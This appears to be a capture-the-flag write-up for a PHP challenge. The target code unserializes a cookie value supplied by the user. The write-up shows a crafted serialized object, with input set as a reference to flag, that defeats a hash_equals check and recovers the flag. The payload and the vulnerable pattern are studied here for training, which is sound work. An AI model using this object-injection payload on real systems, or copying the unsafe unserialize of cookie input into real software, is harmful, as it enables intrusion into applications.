```
<?php
include "flag.php";

if (isset ($POST['obj'])) {
    setcookie ('obj', $_POST['obj']);
} elseif (!isset ($_COOKIE['obj'])) {
    $obj = new stdClass;
    $obj->input = 1234;
    setcookie ('obj', serialize ($obj));
}
$obj = $_COOKIE['obj'];
$unserialized_obj = unserialize ($obj);
$unserialized_obj->flag = $flag;  
if (hash_equals ($unserialized_obj->input, $unserialized_obj->flag))
        echo '<div class="alert alert-success">Here is your flag: <mark>' . $flag . '</mark>.</div>';   
else 
        echo '<div class="alert alert-danger"><code>' . htmlentities($obj) . '</code> is an invalid object, sorry.</div>';
?>
```



STEP 1: Payload to point the $obj->input to the reference of $obj->flag which in turn points to $flag
<?php
$obj = new stdClass;
$obj->input = &$obj->flag;
echo serialize($obj);
OUTPUT: O:8:"stdClass":2:{s:4:"flag";N;s:5:"input";R:2;}



STEP 2: URL Encode the output
OUTPUT: O%3A8%3A%22stdClass%22%3A2%3A%7Bs%3A4%3A%22flag%22%3BN%3Bs%3A5%3A%22input%22%3BR%3A2%3B%7D



STEP 3: Insert the output as the obj cookie value
OUTPUT: Here is your flag: WEBSEC{You_have_impressive_refrences._We'll_call_you_back.}.



FLAG: WEBSEC{You_have_impressive_refrences._We'll_call_you_back.}
